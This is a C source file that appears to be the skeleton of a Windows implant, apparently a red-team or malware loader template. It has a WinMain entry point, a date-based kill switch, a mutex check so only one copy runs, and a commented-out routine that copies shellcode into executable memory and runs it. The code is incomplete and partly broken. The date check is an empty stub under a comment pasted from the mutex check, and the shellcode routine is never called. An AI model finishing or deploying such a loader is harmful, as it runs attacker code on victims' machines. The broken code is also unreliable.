#include "implant.h"
#include "config.h"

//////////////////////////////////////////////////////////////////////////////////
//
//   WinMain
//   Entrypoint
//
//////////////////////////////////////////////////////////////////////////////////

int APIENTRY WinMain(_In_ HINSTANCE hInst,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	CheckExecution();
	ExitProcess((UINT)NULL);
}


//////////////////////////////////////////////////////////////////////////////////
//
//   CheckExecution
//   The main function; it performs the various checks and actions
//   and will execute the shellcode if applicable
//
//////////////////////////////////////////////////////////////////////////////////

void CheckExecution() {

	// Perform the date and time check; if it is outside the permitted
	// date, return now
	if (!DateTimeCheck()) return;

	// Perform the Mutex check; if it is already running, quit now
	if (!MutexCheck(MUTEX_NAME)) return;


}


//////////////////////////////////////////////////////////////////////////////////
//
//   MutexCheck
//   Returns FALSE if we should bail out now because of the mutex
//   or TRUE if we can carry on
//
//////////////////////////////////////////////////////////////////////////////////
unsigned int MutexCheck(const char *name) {
	HANDLE mutex = NULL, error = NULL;

	mutex = CreateMutex(NULL, TRUE, name);
	if (mutex == NULL) {
		// Error creating the mutex. This could be because
		// we are trying to create a Global mutex and it exists
		// already.
		return FALSE;
	}
	else {
		// Handle has been returned
		error = (HANDLE)GetLastError();
		if (error == (HANDLE)ERROR_ALREADY_EXISTS) {
			// Mutex already exists
			return FALSE;
		}
		else {
			return TRUE;
		}
	}
}



//////////////////////////////////////////////////////////////////////////////////
//
//   DateTimeCheck()
//   Returns FALSE if we should bail out now because of the mutex
//   or TRUE if we can carry on
//
//////////////////////////////////////////////////////////////////////////////////
unsigned int DateTimeCheck() {

}

void ExecuteShellcode() {

	//char *buffer;
	//void(*shellcodefunction)();
	//unsigned int size = sizeof(buf);

	// No mutex exists, so run the code
	//buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//memcpy(buffer, buf, size);
	//shellcodefunction = (void(*)()) buffer;
	//shellcodefunction();
}